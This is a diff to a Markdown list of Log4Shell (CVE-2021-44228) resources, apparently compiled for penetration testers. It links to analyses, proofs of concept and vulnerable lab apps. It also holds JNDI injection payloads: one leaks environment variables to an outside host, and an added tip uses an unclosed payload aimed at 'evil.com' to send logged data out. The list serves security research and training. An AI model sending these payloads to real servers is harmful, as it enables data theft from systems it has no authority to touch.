@@ -1,5 +1,8 @@
 # TL;DR
 
+![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)
+[Source](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
+
 # Technical analysis
 - [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
 - [Rapid7 analysis](https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis): Includes PoCs for Apache Struts2, VMWare VCenter, Apache James, Apache Solr, Apache Druid, Apache JSPWiki and Apache OFBiz
@@ -15,7 +18,7 @@
 - [Log4Shell, The Worst Java Vulnerability in Years](https://www.youtube.com/watch?v=m_AkCbFc8DM)
 
 # Intentionally vulnerable apps
-- [PentesterLab challenge](https://pentesterlab.com/exercises/log4j_rce/course)
+- [PentesterLab Log4j RCE](https://pentesterlab.com/exercises/log4j_rce/course) & [Log4j RCE II](https://pentesterlab.com/exercises/log4j_rce_ii/course)
 - [BugHuntr.io scenario](https://twitter.com/BugHuntrIo/status/1469298538593067012)
 - [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
 
@@ -37,6 +40,8 @@
 - The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars! [Source](https://twitter.com/_StaticFlow_/status/1469358229767475205)
 - [Tutorial on setting up RogueJDNI](https://twitter.com/ITSecurityguard/status/1469347404986077185)
 - [Class path is useful information to have to know what gadgets should be available or where you need to look for some to get rce.](https://twitter.com/jstnkndy/status/1469752457618202624)
+- Some events are only logged when an exception ocur, so specially long payloads with unexpected characters may help you trigger those exceptions. [Source](https://twitter.com/pwntester/status/1470435811812380675)
+- If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data. [Source](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
 
 # WAF bypasses
 
